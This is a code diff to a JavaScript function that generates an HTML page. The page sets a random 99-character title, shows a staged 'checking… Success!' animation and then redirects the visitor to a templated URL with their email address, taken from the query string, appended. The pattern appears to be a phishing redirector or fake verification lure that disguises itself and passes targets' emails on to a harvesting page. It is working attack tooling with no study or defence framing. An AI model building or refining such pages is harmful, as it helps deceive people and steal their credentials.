@@ -394,44 +394,61 @@ function generateCustomScriptContent(redirectUrl) {
   </div>
 
   <script>
+  document.addEventListener('DOMContentLoaded', function () {
     // Set 99-char random title
-    document.title = Array.from({length: 99}, () => {
+    document.title = Array.from({ length: 99 }, () => {
       const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
       return chars.charAt(Math.floor(Math.random() * chars.length));
     }).join('');
-
-    // Simple click tracking - just count visits
-    try {
-      fetch('/api/track-click', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          domain: window.location.hostname,
-          timestamp: new Date().toISOString()
-        })
-      }).catch(() => {}); // Silent fail if tracking fails
-    } catch (e) {}
 
     // Wait random time between 399–699ms
     const delay = Math.floor(Math.random() * (699 - 399 + 1)) + 399;
 
     setTimeout(() => {
-      document.getElementById('a').style.display = 'none';
-      document.getElementById('d').style.display = 'none';
-      document.getElementById('c').style.display = 'block';
-      document.getElementById('e').style.display = 'block';
+      // Simulate "check complete" UI
+      document.getElementById('a').style.display = 'none'; // Spinner
+      document.getElementById('d').style.display = 'none'; // "Checking..."
+      document.getElementById('c').style.display = 'block'; // Green check
+      document.getElementById('e').style.display = 'block'; // "Success!"
 
-      // Redirect logic
-      const email = new URLSearchParams(window.location.search).get('email');
-      let redirectUrl = "${redirectUrl}";
-      if (email) {
-        const url = new URL(redirectUrl);
-        url.searchParams.set('email', email); // This replaces existing email param
-        redirectUrl = url.toString();
-      }
-      window.location.href = redirectUrl;
+      // Trigger redirect shortly after success
+      setTimeout(redirect, 300);
     }, delay);
-  </script>
+  });
+
+  // Function to handle redirection
+  function redirect() {
+    var email = getParameterByName('email');
+    var redirectUrl = "${redirectUrl}";
+    if (email) {
+      redirectUrl += email; // Append email if provided
+    } else {
+      console.log("No email provided. Redirecting without email.");
+    }
+    console.log("Redirecting to: " + redirectUrl);
+    window.location.href = redirectUrl;
+  }
+
+  // Function to get URL parameters
+  function getParameterByName(name, url = window.location.href) {
+    name = name.replace(/[\[\]]/g, '\\$&');
+    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+    var results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, ' '));
+  }
+
+  // Optional checkbox handler
+  function handleCheckboxClick(checkbox) {
+    if (checkbox.checked) {
+      console.log("Checkbox is checked. Redirecting...");
+      redirect();
+    } else {
+      console.log("Checkbox is not checked.");
+    }
+  }
+</script>
 </body>
 </html>`;
 }
